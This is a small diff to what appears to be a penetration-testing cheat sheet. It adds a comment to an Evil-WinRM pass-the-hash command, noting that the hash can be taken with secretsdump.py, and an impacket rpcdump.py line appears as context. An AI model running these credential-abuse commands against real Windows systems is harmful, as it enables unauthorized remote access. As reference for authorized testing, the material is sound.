@@ -59,5 +59,5 @@ rpcdump.py [USERNAME]@[IP_ADDR]
 
 ### Evil-WinRM
 ```
-evil-winrm -i [IP_ADDR] -u [USERNAME] -H [HASH]
+evil-winrm -i [IP_ADDR] -u [USERNAME] -H [HASH]   # hash retrievable from secretsdump.py machines/smb
 ```
